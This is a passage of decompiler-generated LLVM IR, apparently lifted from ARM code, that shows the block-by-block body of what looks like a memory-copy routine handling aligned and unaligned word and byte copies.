bb136:                                            ; preds = %dec_label_pc_18074
  %v3_18078 = load i32, i32* @r1, align 4
  %v4_18078 = inttoptr i32 %v3_18078 to i32*
  %v5_18078 = load i32, i32* %v4_18078, align 4
  store i32 %v5_18078, i32* @r3, align 4
  %v6_18078 = add i32 %v3_18078, 4
  %v7_18078 = inttoptr i32 %v6_18078 to i32*
  %v8_18078 = load i32, i32* %v7_18078, align 4
  store i32 %v8_18078, i32* %r4.global-to-local, align 4
  %v9_18078 = add i32 %v3_18078, 8
  %v10_18078 = inttoptr i32 %v9_18078 to i32*
  %v11_18078 = load i32, i32* %v10_18078, align 4
  store i32 %v11_18078, i32* @ip, align 4
  %v12_18078 = add i32 %v3_18078, 12
  %v13_18078 = inttoptr i32 %v12_18078 to i32*
  %v14_18078 = load i32, i32* %v13_18078, align 4
  store i32 %v14_18078, i32* %lr.global-to-local, align 4
  %v15_18078 = add i32 %v3_18078, 16
  store i32 %v15_18078, i32* @r1, align 4
  %v4_1807c = inttoptr i32 %v12_18068 to i32*
  store i32 %v5_18078, i32* %v4_1807c, align 4
  %v6_1807c = add i32 %v0_18060, 36
  %v7_1807c = inttoptr i32 %v6_1807c to i32*
  %v8_1807c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1807c, i32* %v7_1807c, align 4
  %v9_1807c = add i32 %v0_18060, 40
  %v10_1807c = inttoptr i32 %v9_1807c to i32*
  %v11_1807c = load i32, i32* @ip, align 4
  store i32 %v11_1807c, i32* %v10_1807c, align 4
  %v12_1807c = add i32 %v0_18060, 44
  %v13_1807c = inttoptr i32 %v12_1807c to i32*
  %v14_1807c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1807c, i32* %v13_1807c, align 4
  %v15_1807c = add i32 %v0_18060, 48
  store i32 %v15_1807c, i32* @r0, align 4
  %v3_18080 = load i32, i32* %r2.global-to-local, align 4
  %v4_18080 = add i32 %v3_18080, -16
  store i32 %v4_18080, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_18074, %bb136
  %v3_18090102111 = phi i32 [ %v15_1807c, %bb136 ], [ %v12_18068, %dec_label_pc_18074 ]
  %v0_18088.pre = phi i32 [ %v4_18080, %bb136 ], [ %v1_1806c, %dec_label_pc_18074 ]
  %v2_18084 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18084, i32* @r4, align 4
  br label %dec_label_pc_18088

dec_label_pc_18088:                               ; preds = %dec_label_pc_18050, %bb137
  %v3_18090101 = phi i32 [ %v0_1806094, %dec_label_pc_18050 ], [ %v3_18090102111, %bb137 ]
  %v0_18088 = phi i32 [ %v1_18050, %dec_label_pc_18050 ], [ %v0_18088.pre, %bb137 ]
  %v1_18088 = add i32 %v0_18088, 20
  store i32 %v1_18088, i32* %r2.global-to-local, align 4
  %v3_18088 = sub i32 0, %v0_18088
  %v4_18088 = and i32 %v1_18088, %v3_18088
  %v5_18088 = icmp slt i32 %v4_18088, 0
  store i1 %v5_18088, i1* %cpsr_v.global-to-local, align 1
  %v6_18088 = icmp slt i32 %v1_18088, 0
  store i1 %v6_18088, i1* %cpsr_n.global-to-local, align 1
  %v7_18088 = icmp eq i32 %v1_18088, 0
  store i1 %v7_18088, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1808c

dec_label_pc_1808c:                               ; preds = %.thread115, %dec_label_pc_18088
  %v0_1809c.pre157 = phi i32 [ %v0_1809c.pre, %.thread115 ], [ %v1_18088, %dec_label_pc_18088 ]
  %v3_18090 = phi i32 [ %v3_1809099116, %.thread115 ], [ %v3_18090101, %dec_label_pc_18088 ]
  %v1_18094 = phi i1 [ %v1_18098, %.thread115 ], [ %v5_18088, %dec_label_pc_18088 ]
  %v0_18094 = phi i1 [ %v0_18098, %.thread115 ], [ %v6_18088, %dec_label_pc_18088 ]
  %v2_1808c = xor i1 %v1_18094, %v0_18094
  br i1 %v2_1808c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1808c
  %v3_1808c = load i32, i32* @r1, align 4
  %v4_1808c = inttoptr i32 %v3_1808c to i32*
  %v5_1808c = load i32, i32* %v4_1808c, align 4
  store i32 %v5_1808c, i32* @r3, align 4
  %v6_1808c = add i32 %v3_1808c, 4
  %v7_1808c = inttoptr i32 %v6_1808c to i32*
  %v8_1808c = load i32, i32* %v7_1808c, align 4
  store i32 %v8_1808c, i32* @ip, align 4
  %v9_1808c = add i32 %v3_1808c, 8
  %v10_1808c = inttoptr i32 %v9_1808c to i32*
  %v11_1808c = load i32, i32* %v10_1808c, align 4
  store i32 %v11_1808c, i32* %lr.global-to-local, align 4
  %v12_1808c = add i32 %v3_1808c, 12
  store i32 %v12_1808c, i32* @r1, align 4
  %v4_18090 = inttoptr i32 %v3_18090 to i32*
  store i32 %v5_1808c, i32* %v4_18090, align 4
  %v6_18090 = add i32 %v3_18090, 4
  %v7_18090 = inttoptr i32 %v6_18090 to i32*
  %v8_18090 = load i32, i32* @ip, align 4
  store i32 %v8_18090, i32* %v7_18090, align 4
  %v9_18090 = add i32 %v3_18090, 8
  %v10_18090 = inttoptr i32 %v9_18090 to i32*
  %v11_18090 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18090, i32* %v10_18090, align 4
  %v12_18090 = add i32 %v3_18090, 12
  store i32 %v12_18090, i32* @r0, align 4
  %v3_18094 = load i32, i32* %r2.global-to-local, align 4
  %v4_18094 = add i32 %v3_18094, -12
  store i32 %v4_18094, i32* %r2.global-to-local, align 4
  %v6_18094 = sub i32 11, %v3_18094
  %v7_18094 = and i32 %v6_18094, %v3_18094
  %v8_18094 = icmp slt i32 %v7_18094, 0
  store i1 %v8_18094, i1* %cpsr_v.global-to-local, align 1
  %v9_18094 = icmp slt i32 %v4_18094, 0
  store i1 %v9_18094, i1* %cpsr_n.global-to-local, align 1
  %v10_18094 = icmp eq i32 %v3_18094, 12
  store i1 %v10_18094, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1808c, %bb138
  %v0_1809c.pre = phi i32 [ %v4_18094, %bb138 ], [ %v0_1809c.pre157, %dec_label_pc_1808c ]
  %v3_1809099116 = phi i32 [ %v12_18090, %bb138 ], [ %v3_18090, %dec_label_pc_1808c ]
  %v1_18098 = phi i1 [ %v8_18094, %bb138 ], [ %v1_18094, %dec_label_pc_1808c ]
  %v0_18098 = phi i1 [ %v9_18094, %bb138 ], [ %v0_18094, %dec_label_pc_1808c ]
  %v2_18098 = xor i1 %v1_18098, %v0_18098
  br i1 %v2_18098, label %dec_label_pc_1809c, label %dec_label_pc_1808c

dec_label_pc_1809c:                               ; preds = %.thread115, %dec_label_pc_18048
  %v4_180ac = phi i32 [ %v0_1806094, %dec_label_pc_18048 ], [ %v3_1809099116, %.thread115 ]
  %v0_1809c = phi i32 [ %v1_18048, %dec_label_pc_18048 ], [ %v0_1809c.pre, %.thread115 ]
  %v1_1809c = add i32 %v0_1809c, 8
  store i32 %v1_1809c, i32* %r2.global-to-local, align 4
  %v3_1809c = sub i32 0, %v0_1809c
  %v4_1809c = and i32 %v1_1809c, %v3_1809c
  %v5_1809c = icmp slt i32 %v4_1809c, 0
  store i1 %v5_1809c, i1* %cpsr_v.global-to-local, align 1
  %v6_1809c = icmp slt i32 %v1_1809c, 0
  store i1 %v6_1809c, i1* %cpsr_n.global-to-local, align 1
  %v7_1809c = icmp eq i32 %v1_1809c, 0
  store i1 %v7_1809c, i1* %cpsr_z.global-to-local, align 1
  %v2_180a0 = xor i1 %v6_1809c, %v5_1809c
  br i1 %v2_180a0, label %bb140, label %dec_label_pc_180a4

dec_label_pc_180a4:                               ; preds = %dec_label_pc_1809c
  %v1_180a4 = add i32 %v0_1809c, 4
  store i32 %v1_180a4, i32* %r2.global-to-local, align 4
  %v3_180a4 = sub i32 -5, %v0_1809c
  %v4_180a4 = and i32 %v3_180a4, %v1_1809c
  %v5_180a4 = icmp slt i32 %v4_180a4, 0
  store i1 %v5_180a4, i1* %cpsr_v.global-to-local, align 1
  %v6_180a4 = icmp slt i32 %v1_180a4, 0
  store i1 %v6_180a4, i1* %cpsr_n.global-to-local, align 1
  %v7_180a4 = icmp eq i32 %v1_1809c, 4
  store i1 %v7_180a4, i1* %cpsr_z.global-to-local, align 1
  %v2_180a8 = xor i1 %v6_180a4, %v5_180a4
  %v3_180a8 = load i32, i32* @r1, align 4
  %v4_180a8 = inttoptr i32 %v3_180a8 to i32*
  %v5_180a8 = load i32, i32* %v4_180a8, align 4
  store i32 %v5_180a8, i32* @r3, align 4
  %v7_180a8 = add i32 %v3_180a8, 4
  br i1 %v2_180a8, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_180a4
  store i32 %v7_180a8, i32* @r1, align 4
  %v5_180ac = inttoptr i32 %v4_180ac to i32*
  store i32 %v5_180a8, i32* %v5_180ac, align 4
  %v6_180ac = load i32, i32* @r0, align 4
  %v7_180ac = add i32 %v6_180ac, 4
  store i32 %v7_180ac, i32* @r0, align 4
  %v0_180bc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_180a4
  %v7_180b0 = inttoptr i32 %v7_180a8 to i32*
  %v8_180b0 = load i32, i32* %v7_180b0, align 4
  store i32 %v8_180b0, i32* @ip, align 4
  %v9_180b0 = add i32 %v3_180a8, 8
  store i32 %v9_180b0, i32* @r1, align 4
  %v4_180b4 = inttoptr i32 %v4_180ac to i32*
  store i32 %v5_180a8, i32* %v4_180b4, align 4
  %v6_180b4 = add i32 %v4_180ac, 4
  %v7_180b4 = inttoptr i32 %v6_180b4 to i32*
  %v8_180b4 = load i32, i32* @ip, align 4
  store i32 %v8_180b4, i32* %v7_180b4, align 4
  %v9_180b4 = add i32 %v4_180ac, 8
  store i32 %v9_180b4, i32* @r0, align 4
  %v3_180b8 = load i32, i32* %r2.global-to-local, align 4
  %v4_180b8 = add i32 %v3_180b8, -4
  store i32 %v4_180b8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1809c, %bb, %dec_label_pc_1826c, %dec_label_pc_18200, %dec_label_pc_18194, %bb139
  %v0_180bc = phi i32 [ %v0_180bc.pre, %.thread122 ], [ %v2_1810c, %.thread128 ], [ %v1_1809c, %dec_label_pc_1809c ], [ %v2_18030, %bb ], [ %v0_180bc61, %dec_label_pc_1826c ], [ %v0_180bc60, %dec_label_pc_18200 ], [ %v0_180bc59, %dec_label_pc_18194 ], [ %v4_180b8, %bb139 ]
  %v1_180bc = add i32 %v0_180bc, 4
  store i32 %v1_180bc, i32* %r2.global-to-local, align 4
  %v3_180bc = sub i32 0, %v0_180bc
  %v4_180bc = and i32 %v1_180bc, %v3_180bc
  %v5_180bc = icmp slt i32 %v4_180bc, 0
  store i1 %v5_180bc, i1* %cpsr_v.global-to-local, align 1
  %v6_180bc = icmp slt i32 %v1_180bc, 0
  store i1 %v6_180bc, i1* %cpsr_n.global-to-local, align 1
  %v7_180bc = icmp eq i32 %v1_180bc, 0
  store i1 %v7_180bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_180bc, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_180c4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_180c0 = load i8*, i8** %stack_var_-8, align 4
  %v4_180c0 = ptrtoint i8* %v3_180c0 to i32
  store i32 %v4_180c0, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_180c4 = phi i32 [ %v0_180c4.pre, %bb140.bb142_crit_edge ], [ %v8_1802c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_180bc, i32 %v0_180c4)
  %v0_180c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_180c8 = add i32 %v0_180c8, -2
  %v3_180c8 = sub i32 1, %v0_180c8
  %v4_180c8 = and i32 %v3_180c8, %v0_180c8
  %v5_180c8 = icmp slt i32 %v4_180c8, 0
  store i1 %v5_180c8, i1* %cpsr_v.global-to-local, align 1
  %v6_180c8 = icmp slt i32 %v1_180c8, 0
  store i1 %v6_180c8, i1* %cpsr_n.global-to-local, align 1
  %v7_180c8 = icmp eq i32 %v0_180c8, 2
  store i1 %v7_180c8, i1* %cpsr_z.global-to-local, align 1
  %v0_180cc = load i32, i32* @r1, align 4
  %v1_180cc = inttoptr i32 %v0_180cc to i8*
  %v2_180cc = load i8, i8* %v1_180cc, align 1
  %v5_180cc = add i32 %v0_180cc, 1
  store i32 %v5_180cc, i32* %r1.global-to-local, align 4
  %v2_180d0 = load i32, i32* @r0, align 4
  %v3_180d0 = inttoptr i32 %v2_180d0 to i8*
  store i8 %v2_180cc, i8* %v3_180d0, align 1
  %v4_180d0 = load i32, i32* @r0, align 4
  %v5_180d0 = add i32 %v4_180d0, 1
  store i32 %v5_180d0, i32* %r0.global-to-local, align 4
  %v0_180d4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_180d4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_180d4 = xor i1 %v0_180d4, %v1_180d4
  br i1 %v2_180d4, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_180d4 = load i32, i32* %r1.global-to-local, align 4
  %v4_180d4 = inttoptr i32 %v3_180d4 to i8*
  %v5_180d4 = load i8, i8* %v4_180d4, align 1
  %v8_180d4 = add i32 %v3_180d4, 1
  store i32 %v8_180d4, i32* %r1.global-to-local, align 4
  %v6_180d8 = inttoptr i32 %v5_180d0 to i8*
  store i8 %v5_180d4, i8* %v6_180d8, align 1
  %v7_180d8 = load i32, i32* %r0.global-to-local, align 4
  %v8_180d8 = add i32 %v7_180d8, 1
  store i32 %v8_180d8, i32* %r0.global-to-local, align 4
  %v1_180dc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_180dc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_180e0 = phi i32 [ %v8_180d8, %bb143 ], [ %v5_180d0, %bb142 ]
  %v2_180e0 = phi i1 [ %v2_180dc.pre, %bb143 ], [ %v1_180d4, %bb142 ]
  %v1_180e0 = phi i1 [ %v1_180dc.pre, %bb143 ], [ %v0_180d4, %bb142 ]
  %v0_180dc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_180dc = xor i1 %v2_180e0, %v1_180e0
  %v4_180dc = or i1 %v0_180dc, %v3_180dc
  br i1 %v4_180dc, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_180dc = load i32, i32* %r1.global-to-local, align 4
  %v6_180dc = inttoptr i32 %v5_180dc to i8*
  %v7_180dc = load i8, i8* %v6_180dc, align 1
  %v10_180dc = add i32 %v5_180dc, 1
  store i32 %v10_180dc, i32* %r1.global-to-local, align 4
  %v8_180e0 = inttoptr i32 %v7_180e0 to i8*
  store i8 %v7_180dc, i8* %v8_180e0, align 1
  %v9_180e0 = load i32, i32* %r0.global-to-local, align 4
  %v10_180e0 = add i32 %v9_180e0, 1
  store i32 %v10_180e0, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_180e4 = load i8*, i8** %stack_var_-8, align 4
  %v3_180e4 = ptrtoint i8* %v2_180e4 to i32
  store i32 %v3_180e4, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1802c)
  %v0_180ec.pre = load i32, i32* @ip, align 4
  %v0_180f4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_180f8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_180ec

dec_label_pc_180ec:                               ; preds = %dec_label_pc_18038, %.thread126
  %v2_180f8 = phi i32 [ %v1_18020, %dec_label_pc_18038 ], [ %v2_180f8.pre, %.thread126 ]
  %v0_180f4 = phi i32 [ %v0_18020, %dec_label_pc_18038 ], [ %v0_180f4.pre, %.thread126 ]
  %v0_180ec = phi i32 [ %v1_18038, %dec_label_pc_18038 ], [ %v0_180ec.pre, %.thread126 ]
  %v1_180ec = sub i32 4, %v0_180ec
  store i32 %v1_180ec, i32* @ip, align 4
  %v1_180f0 = add i32 %v1_180ec, -2
  %v3_180f0 = sub i32 1, %v1_180ec
  %v4_180f0 = and i32 %v3_180f0, %v1_180ec
  %v5_180f0 = icmp slt i32 %v4_180f0, 0
  store i1 %v5_180f0, i1* %cpsr_v.global-to-local, align 1
  %v6_180f0 = icmp slt i32 %v1_180f0, 0
  store i1 %v6_180f0, i1* %cpsr_n.global-to-local, align 1
  %v7_180f0 = icmp eq i32 %v1_180ec, 2
  store i1 %v7_180f0, i1* %cpsr_z.global-to-local, align 1
  %v1_180f4 = inttoptr i32 %v0_180f4 to i8*
  %v2_180f4 = load i8, i8* %v1_180f4, align 1
  %v3_180f4 = zext i8 %v2_180f4 to i32
  store i32 %v3_180f4, i32* @r3, align 4
  %v5_180f4 = add i32 %v0_180f4, 1
  store i32 %v5_180f4, i32* @r1, align 4
  %v3_180f8 = inttoptr i32 %v2_180f8 to i8*
  store i8 %v2_180f4, i8* %v3_180f8, align 1
  %v4_180f8 = load i32, i32* @r0, align 4
  %v5_180f8 = add i32 %v4_180f8, 1
  store i32 %v5_180f8, i32* @r0, align 4
  %v0_180fc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_180fc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_180fc = xor i1 %v0_180fc, %v1_180fc
  br i1 %v2_180fc, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_180ec
  %v3_180fc = load i32, i32* @r1, align 4
  %v4_180fc = inttoptr i32 %v3_180fc to i8*
  %v5_180fc = load i8, i8* %v4_180fc, align 1
  %v6_180fc = zext i8 %v5_180fc to i32
  store i32 %v6_180fc, i32* @r3, align 4
  %v8_180fc = add i32 %v3_180fc, 1
  store i32 %v8_180fc, i32* @r1, align 4
  %v6_18100 = inttoptr i32 %v5_180f8 to i8*
  store i8 %v5_180fc, i8* %v6_18100, align 1
  %v7_18100 = load i32, i32* @r0, align 4
  %v8_18100 = add i32 %v7_18100, 1
  store i32 %v8_18100, i32* @r0, align 4
  %v1_18104.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18104.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_180ec, %bb145
  %v7_18108 = phi i32 [ %v8_18100, %bb145 ], [ %v5_180f8, %dec_label_pc_180ec ]
  %v2_18108 = phi i1 [ %v2_18104.pre, %bb145 ], [ %v1_180fc, %dec_label_pc_180ec ]
  %v1_18108 = phi i1 [ %v1_18104.pre, %bb145 ], [ %v0_180fc, %dec_label_pc_180ec ]
  %v0_18104 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18104 = xor i1 %v2_18108, %v1_18108
  %v4_18104 = or i1 %v0_18104, %v3_18104
  br i1 %v4_18104, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_18104 = load i32, i32* @r1, align 4
  %v6_18104 = inttoptr i32 %v5_18104 to i8*
  %v7_18104 = load i8, i8* %v6_18104, align 1
  %v8_18104 = zext i8 %v7_18104 to i32
  store i32 %v8_18104, i32* @r3, align 4
  %v10_18104 = add i32 %v5_18104, 1
  store i32 %v10_18104, i32* @r1, align 4
  %v8_18108 = inttoptr i32 %v7_18108 to i8*
  store i8 %v7_18104, i8* %v8_18108, align 1
  %v9_18108 = load i32, i32* @r0, align 4
  %v10_18108 = add i32 %v9_18108, 1
  store i32 %v10_18108, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1823c77 = phi i32 [ %v10_18108, %bb146 ], [ %v7_18108, %.thread127 ]
  %v0_1810c = load i32, i32* %r2.global-to-local, align 4
  %v1_1810c = load i32, i32* @ip, align 4
  %v2_1810c = sub i32 %v0_1810c, %v1_1810c
  store i32 %v2_1810c, i32* %r2.global-to-local, align 4
  %v4_1810c = xor i32 %v1_1810c, %v0_1810c
  %v5_1810c = xor i32 %v2_1810c, %v0_1810c
  %v6_1810c = and i32 %v5_1810c, %v4_1810c
  %v7_1810c = icmp slt i32 %v6_1810c, 0
  store i1 %v7_1810c, i1* %cpsr_v.global-to-local, align 1
  %v8_1810c = icmp slt i32 %v2_1810c, 0
  store i1 %v8_1810c, i1* %cpsr_n.global-to-local, align 1
  %v9_1810c = icmp eq i32 %v0_1810c, %v1_1810c
  store i1 %v9_1810c, i1* %cpsr_z.global-to-local, align 1
  %v2_18110 = xor i1 %v8_1810c, %v7_1810c
  br i1 %v2_18110, label %bb140, label %dec_label_pc_18114

dec_label_pc_18114:                               ; preds = %.thread128
  %v0_18114 = load i32, i32* @r1, align 4
  %v1_18114 = urem i32 %v0_18114, 4
  store i32 %v1_18114, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18114 = icmp eq i32 %v1_18114, 0
  store i1 %v2_18114, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_18114 to i2
  br i1 %v2_18114, label %dec_label_pc_18048, label %dec_label_pc_1811c

dec_label_pc_1811c:                               ; preds = %dec_label_pc_18040, %dec_label_pc_18114
  %v0_1823c76 = phi i32 [ %v1_18020, %dec_label_pc_18040 ], [ %v0_1823c77, %dec_label_pc_18114 ]
  %v0_181a4 = phi i32 [ %v2_18030, %dec_label_pc_18040 ], [ %v2_1810c, %dec_label_pc_18114 ]
  %v0_18124.off0 = phi i2 [ %extract.t, %dec_label_pc_18040 ], [ %extract.t131, %dec_label_pc_18114 ]
  %v0_1811c = phi i32 [ %v0_18020, %dec_label_pc_18040 ], [ %v0_18114, %dec_label_pc_18114 ]
  %v1_1811c = and i32 %v0_1811c, -4
  store i32 %v1_1811c, i32* %r1.global-to-local, align 4
  %v1_18120 = inttoptr i32 %v1_1811c to i32*
  %v2_18120 = load i32, i32* %v1_18120, align 4
  store i32 %v2_18120, i32* %lr.global-to-local, align 4
  %v4_18120 = add i32 %v1_1811c, 4
  store i32 %v4_18120, i32* %r1.global-to-local, align 4
  %v1_1819c = add i32 %v0_181a4, -12
  %v3_1819c = sub i32 11, %v0_181a4
  %v4_1819c = and i32 %v3_1819c, %v0_181a4
  %v5_1819c = icmp slt i32 %v4_1819c, 0
  store i1 %v5_1819c, i1* %cpsr_v.global-to-local, align 1
  %v6_1819c = icmp slt i32 %v1_1819c, 0
  store i1 %v6_1819c, i1* %cpsr_n.global-to-local, align 1
  %v7_1819c = icmp eq i32 %v0_181a4, 12
  store i1 %v7_1819c, i1* %cpsr_z.global-to-local, align 1
  %v2_181a0 = xor i1 %v6_1819c, %v5_1819c
  switch i2 %v0_18124.off0, label %dec_label_pc_18130 [
    i2 -1, label %dec_label_pc_18208
    i2 -2, label %dec_label_pc_1819c
  ]

dec_label_pc_18130:                               ; preds = %dec_label_pc_1811c
  br i1 %v2_181a0, label %dec_label_pc_1817c, label %dec_label_pc_18138

dec_label_pc_18138:                               ; preds = %dec_label_pc_18130
  store i32 %v1_1819c, i32* %r2.global-to-local, align 4
  %v3_1813c = load i32, i32* @r4, align 4
  store i32 %v3_1813c, i32* %stack_var_-16, align 4
  %v6_1813c = load i32, i32* @r5, align 4
  store i32 %v6_1813c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18140

dec_label_pc_18140:                               ; preds = %dec_label_pc_18140.dec_label_pc_18140_crit_edge, %dec_label_pc_18138
  %v0_18164 = phi i32 [ %v12_18164, %dec_label_pc_18140.dec_label_pc_18140_crit_edge ], [ %v0_1823c76, %dec_label_pc_18138 ]
  %v0_18144 = phi i32 [ %v0_18144.pre, %dec_label_pc_18140.dec_label_pc_18140_crit_edge ], [ %v4_18120, %dec_label_pc_18138 ]
  %v0_18140 = phi i32 [ %v0_18140.pre, %dec_label_pc_18140.dec_label_pc_18140_crit_edge ], [ %v2_18120, %dec_label_pc_18138 ]
  %v3_18140 = udiv i32 %v0_18140, 256
  %v1_18144 = inttoptr i32 %v0_18144 to i32*
  %v2_18144 = load i32, i32* %v1_18144, align 4
  store i32 %v2_18144, i32* %r4.global-to-local, align 4
  %v3_18144 = add i32 %v0_18144, 4
  %v4_18144 = inttoptr i32 %v3_18144 to i32*
  %v5_18144 = load i32, i32* %v4_18144, align 4
  store i32 %v5_18144, i32* %r5.global-to-local, align 4
  %v6_18144 = add i32 %v0_18144, 8
  %v7_18144 = inttoptr i32 %v6_18144 to i32*
  %v8_18144 = load i32, i32* %v7_18144, align 4
  store i32 %v8_18144, i32* %ip.global-to-local, align 4
  %v9_18144 = add i32 %v0_18144, 12
  %v10_18144 = inttoptr i32 %v9_18144 to i32*
  %v11_18144 = load i32, i32* %v10_18144, align 4
  store i32 %v11_18144, i32* %lr.global-to-local, align 4
  %v12_18144 = add i32 %v0_18144, 16
  store i32 %v12_18144, i32* %r1.global-to-local, align 4
  %v4_18148 = mul i32 %v2_18144, 16777216
  %v5_18148 = or i32 %v4_18148, %v3_18140
  store i32 %v5_18148, i32* @r3, align 4
  %v3_1814c = udiv i32 %v2_18144, 256
  %v4_18150 = mul i32 %v5_18144, 16777216
  %v5_18150 = or i32 %v4_18150, %v3_1814c
  store i32 %v5_18150, i32* %r4.global-to-local, align 4
  %v3_18154 = udiv i32 %v5_18144, 256
  %v4_18158 = mul i32 %v8_18144, 16777216
  %v5_18158 = or i32 %v4_18158, %v3_18154
  store i32 %v5_18158, i32* %r5.global-to-local, align 4
  %v3_1815c = udiv i32 %v8_18144, 256
  %v4_18160 = mul i32 %v11_18144, 16777216
  %v5_18160 = or i32 %v4_18160, %v3_1815c
  store i32 %v5_18160, i32* @ip, align 4
  %v1_18164 = inttoptr i32 %v0_18164 to i32*
  store i32 %v5_18148, i32* %v1_18164, align 4
  %v3_18164 = add i32 %v0_18164, 4
  %v4_18164 = inttoptr i32 %v3_18164 to i32*
  %v5_18164 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18164, i32* %v4_18164, align 4
  %v6_18164 = add i32 %v0_18164, 8
  %v7_18164 = inttoptr i32 %v6_18164 to i32*
  %v8_18164 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18164, i32* %v7_18164, align 4
  %v9_18164 = add i32 %v0_18164, 12
  %v10_18164 = inttoptr i32 %v9_18164 to i32*
  %v11_18164 = load i32, i32* @ip, align 4
  store i32 %v11_18164, i32* %v10_18164, align 4
  %v12_18164 = add i32 %v0_18164, 16
  store i32 %v12_18164, i32* @r0, align 4
  %v0_18168 = load i32, i32* %r2.global-to-local, align 4
  %v1_18168 = add i32 %v0_18168, -16
  store i32 %v1_18168, i32* %r2.global-to-local, align 4
  %v3_18168 = sub i32 15, %v0_18168
  %v4_18168 = and i32 %v3_18168, %v0_18168
  %v5_18168 = icmp slt i32 %v4_18168, 0
  %v6_18168 = icmp slt i32 %v1_18168, 0
  %v2_1816c = xor i1 %v6_18168, %v5_18168
  br i1 %v2_1816c, label %dec_label_pc_18170, label %dec_label_pc_18140.dec_label_pc_18140_crit_edge

dec_label_pc_18140.dec_label_pc_18140_crit_edge:  ; preds = %dec_label_pc_18140
  %v0_18140.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_18144.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18140

dec_label_pc_18170:                               ; preds = %dec_label_pc_18140
  %v2_18170 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18170, i32* @r4, align 4
  %v5_18170 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18170, i32* @r5, align 4
  %v1_18174 = add i32 %v0_18168, -4
  store i32 %v1_18174, i32* %r2.global-to-local, align 4
  %v3_18174 = add i32 %v0_18168, 2147483632
  %v4_18174 = and i32 %v1_18174, %v3_18174
  %v5_18174 = icmp slt i32 %v4_18174, 0
  store i1 %v5_18174, i1* %cpsr_v.global-to-local, align 1
  %v6_18174 = icmp slt i32 %v1_18174, 0
  store i1 %v6_18174, i1* %cpsr_n.global-to-local, align 1
  %v7_18174 = icmp eq i32 %v1_18174, 0
  store i1 %v7_18174, i1* %cpsr_z.global-to-local, align 1
  %v2_18178 = xor i1 %v6_18174, %v5_18174
  br i1 %v2_18178, label %dec_label_pc_18194, label %dec_label_pc_1817c

dec_label_pc_1817c:                               ; preds = %dec_label_pc_18170, %dec_label_pc_18130, %dec_label_pc_1817c
  %v1_18188 = phi i32 [ %v4_18188, %dec_label_pc_1817c ], [ %v12_18164, %dec_label_pc_18170 ], [ %v0_1823c76, %dec_label_pc_18130 ]
  %v0_1817c = load i32, i32* %lr.global-to-local, align 4
  %v3_1817c = udiv i32 %v0_1817c, 256
  store i32 %v3_1817c, i32* %ip.global-to-local, align 4
  %v0_18180 = load i32, i32* %r1.global-to-local, align 4
  %v1_18180 = inttoptr i32 %v0_18180 to i32*
  %v2_18180 = load i32, i32* %v1_18180, align 4
  store i32 %v2_18180, i32* %lr.global-to-local, align 4
  %v4_18180 = add i32 %v0_18180, 4
  store i32 %v4_18180, i32* %r1.global-to-local, align 4
  %v4_18184 = mul i32 %v2_18180, 16777216
  %v5_18184 = or i32 %v4_18184, %v3_1817c
  store i32 %v5_18184, i32* @ip, align 4
  %v2_18188 = inttoptr i32 %v1_18188 to i32*
  store i32 %v5_18184, i32* %v2_18188, align 4
  %v3_18188 = load i32, i32* @r0, align 4
  %v4_18188 = add i32 %v3_18188, 4
  store i32 %v4_18188, i32* @r0, align 4
  %v0_1818c = load i32, i32* %r2.global-to-local, align 4
  %v1_1818c = add i32 %v0_1818c, -4
  store i32 %v1_1818c, i32* %r2.global-to-local, align 4
  %v3_1818c = sub i32 3, %v0_1818c
